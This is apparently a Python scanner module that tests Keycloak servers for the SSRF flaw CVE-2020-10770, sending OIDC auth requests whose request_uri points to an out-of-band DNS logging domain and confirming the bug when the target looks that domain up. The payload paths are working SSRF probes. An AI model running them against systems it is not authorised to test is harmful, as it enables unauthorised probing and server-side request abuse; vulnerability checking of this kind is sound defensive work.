#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2020_10770_payloads = [
    {'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=DNSDOMAIN'},
    {'path': 'realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=DNSDOMAIN'},
    {'path': 'master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=DNSDOMAIN'},
    {'path': 'protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=DNSDOMAIN'},
    {'path': 'openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=DNSDOMAIN'},
]

def cve_2020_10770_scan(clients):
    ''' 强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL '''
    client = clients.get('reqClient')
    sessid = '4a397cf8261c330c8e8c8f584b1b647a'
    
    vul_info = {
        'app_name': 'Keycloak',
        'vul_type': 'SSRF',
        'vul_id': 'CVE-2020-10770',
    }

    for payload in cve_2020_10770_payloads:                     # * Payload
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('DNSDOMAIN', dns_domain) # * Path

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                                    # * dns查询可能较慢, 等一会
        if ((res.status_code == 400) and (dns.result(md, sessid))):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None            
